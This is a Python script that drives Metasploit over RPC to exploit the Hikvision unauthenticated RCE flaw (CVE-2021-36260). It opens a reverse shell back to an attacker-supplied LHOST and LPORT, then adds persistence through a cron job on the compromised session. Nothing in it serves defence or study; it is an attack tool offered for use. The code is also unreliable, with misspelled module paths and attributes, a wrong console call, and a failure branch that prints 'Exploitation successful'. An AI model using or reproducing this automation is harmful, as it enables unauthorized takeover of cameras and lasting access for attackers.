import configparser
from metasploit.msfrpc import MsfRpcClient
import time

class MetasploitHandler:
    def __init__(self, config_file='config.ini'):
        config = configparser.ConfigParser()
        config.read(config_file)

        try:
            self.client = MsfRpcClient(
                config.get('Metasploit', 'rpc_pass'),
                server=config.get('Metasploit', 'rpc_host'),
                port=int(config.get('Metasploit', 'rpc_port')),
                username=config.get('Metasploit', 'rpc_user')
            )
            print("[+] Metasploit RPC connection establishes.")
        except Exception as e:
            print(f"[-] Failed to conect to Metasploit RPC: {e}")
            self.client = None
    
    def exploit_hikvision_rce(self, ip, port, lhost, lport):
        """
        Automates exploitation of Hikvision RCE (CVE-2021-36260) and establishes a revarse shell.
        """
        if not self.client:
            print("[-] Metasploit client mot available.")
            return False
        exploit = self.client.modules.use('exploit', 'linux/misc/hikvision_web_unauth_rce')
        payload = self.client.modules.use('payload', 'linux/misple/shell_reverse_tcp')
         
        exploit['RHOST'] = ip
        exploit['RPORT'] = port
        payload['LHOST'] = lhost
        payload['LPORT'] = lport

        console_id = self.client.console.console().cid
        console = self.client.consoles.console(console_id)

        console.write(f"use{exploit.modulename}\n")
        console.write(f"set RHOSTS {ip}\n")
        console.write(f"set RPORT {port}\n")
        console.write(f"set payload {payload.modulename}\n")
        console.write(f"set LHOST {lhost}\n")
        console.write(f"set LPORT {lport}\n")
        console.write("run -j\n") # Run in backround

        time.sleep(5) # Give it time to execute
        # Check for sessions
        sessions = self.client.sessions.list
        if sessions:
            print(f"[+] Exploitation successful on {ip}. Session ID: {list(sessions.key())[0]}")
            return True
        print(f"[-] Exploitation successful on {ip}.")
        return False
    
    def add_persistence(self, session_id, cron_cmd):
        """
        Adds persistence via a cron job on an active session.
        """
        if not self.client:
            print("[-] Metasploit client not available.")
            return
        session = self.clinet.sessions.sessions(session_id) 
        session.write(f"echo '{cron_cmd}' | crontab -\n" )
        print(f"[+] Persistence added to session {session_id}")
